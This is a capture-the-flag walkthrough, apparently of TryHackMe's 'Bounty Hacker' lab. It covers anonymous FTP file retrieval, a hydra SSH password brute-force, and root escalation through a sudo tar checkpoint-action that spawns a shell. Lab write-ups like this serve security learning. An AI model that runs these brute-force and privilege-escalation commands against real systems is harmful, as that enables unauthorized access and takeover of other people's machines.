We start scanning open ports with Nmap : 

Open ports are :
- 21 FTP
- 22 SSH
- 80 HTTP

![Image Alt](https://github.com/kcoainnapo/Tryhackme/blob/main/Bounty%20Hacker/Images/nmap.png?raw=true)


The port 21 run FTP, allowing anonymous connections so we check it : 

![Image Alt](https://github.com/kcoainnapo/Tryhackme/blob/main/Bounty%20Hacker/Images/FTP.png?raw=true)


I received the message 'passive mode,' so I had to press Ctrl+C and enter 'passive'.

Then I can retrieve all files with the command :
```
mget *
```
We obtain two files : 
- locks.txt
- task.txt

task.txt contains a message written by a user called lin and locks.txt seems to contain a wordlist of password that might be useful later on.

We have a username and a list of password so we can try brute-forcing the SSH service, so for that we use hydra : 
```
hydra -l lin -P locks.txt 10.10.206.57 ssh
```
![Image Alt](https://github.com/kcoainnapo/Tryhackme/blob/main/Bounty%20Hacker/Images/Hydra.png?raw=true)

It worked we found the password of the user lin.

So we connect to SSH with : 
```
ssh lin@10.10.206.57
```
We can obtain the user.txt flag with : 
```
cat /home/lin/Desktop/user.txt 
```
![Image Alt](https://github.com/kcoainnapo/Tryhackme/blob/main/Bounty%20Hacker/Images/user-flag.png?raw=true)

We check our privileges with :
```
sudo -l
```
It reveals that we can run /bin/tar as super user so we check https://gtfobins.github.io/gtfobins/tar/#sudo and we try :
```
sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
Now we are root and can obtain the root flag with :
```
cat /root/*
```
![Image Alt](https://github.com/kcoainnapo/Tryhackme/blob/main/Bounty%20Hacker/Images/root-flag.png?raw=true)

